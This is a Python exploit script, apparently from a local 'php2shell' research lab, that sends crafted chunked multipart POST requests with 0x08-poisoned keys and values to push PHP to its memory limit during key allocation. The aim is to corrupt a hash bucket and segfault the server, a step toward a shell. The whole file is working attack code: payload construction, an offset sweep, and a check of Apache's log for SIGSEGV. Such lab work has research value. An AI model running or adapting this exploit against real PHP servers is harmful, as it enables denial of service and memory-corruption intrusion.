#!/usr/bin/env python3
"""php2shell lab, oom13: unfeedable key run -> key-alloc crossing.

Final blocker found: freed param (1016B) donates to next part's value+key
(840B) -> net growth ~0, wall never crossed. Fix: VALUE=8192 > donation ->
unfeedable ~7.5KB/part. Part where free headroom H enters (8192, 8192+328)
kills the KEY zend_string_init (328B) inside add_to_hash (post-commit) ->
malformed bucket -> teardown dtor on poisoned slot -> segfault 0x0808...
Sweep rem to scan landing positions; fingerprint alloc~328 = WIN.
"""
import re
import subprocess
import sys
import time

UNIT = 128 * 1024
KEYRUN = 1500
V = 8192                    # retained value per key part (bigger than param donation)
POISON = b"\x08"

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def part(name: bytes, val: bytes) -> bytes:
    return (b"--BOUND\r\nContent-Disposition: form-data; name=\"" + name +
            b"\"\r\n\r\n" + val + b"\r\n")

def build(rem: int) -> list[bytes]:
    ps = [part(b"n0", POISON * (256 * 1024)), part(b"n0", POISON * (256 * 1024))]
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))          # table-growth seeds
    fill = POISON * UNIT
    u = 0
    total = 475 * UNIT + rem - 9 * UNIT - 2 * (256 * 1024)
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        # distinct names, varied length (no free-list reuse, no name collision)
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def alloc_n(text: bytes):
    m = re.search(rb"tried to allocate (\d+)", text)
    return int(m.group(1)) if m else None

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)
    # rem sweep: scan landing positions across the kill window
    for rem in range(65000, 65201, 8):
        restart()
        fatal, text = send(port, build(rem))
        a = alloc_n(text) if fatal else None
        log(f"rem={rem}: fatal={fatal} alloc={a}")
        if fatal and a is not None and a < 4000:
            log(f"*** KEY-ALLOC CROSSING at rem={rem} (alloc={a}) — checking segfault ***")
            time.sleep(1)
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c",
                "grep -E 'Segmentation|signal SIGSEGV' /var/log/apache2/error.log | tail -3"],
                capture_output=True, text=True)
            log(r.stdout or "(no segfault lines yet)")
            return
    log("sweep done")

import socket
if __name__ == "__main__":
    main()
